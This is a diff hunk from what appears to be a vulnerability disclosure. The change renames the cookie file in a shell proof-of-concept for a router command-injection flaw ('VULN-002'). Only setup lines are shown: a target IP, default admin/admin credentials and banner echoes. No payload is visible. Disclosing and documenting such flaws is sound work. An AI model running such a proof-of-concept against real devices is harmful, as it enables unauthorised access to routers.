@@ -45,7 +45,7 @@ The following shell script demonstrates the vulnerability (assuming default IP `
 TARGET="192.168.0.1"
 USERNAME="admin"
 PASSWORD="admin"
-COOKIE_FILE="/tmp/di8100_vuln002_cookies.txt"
+COOKIE_FILE="/tmp/di8300_vuln002_cookies.txt"
 
 echo "========================================="
 echo "VULN-002 Command Injection POC"
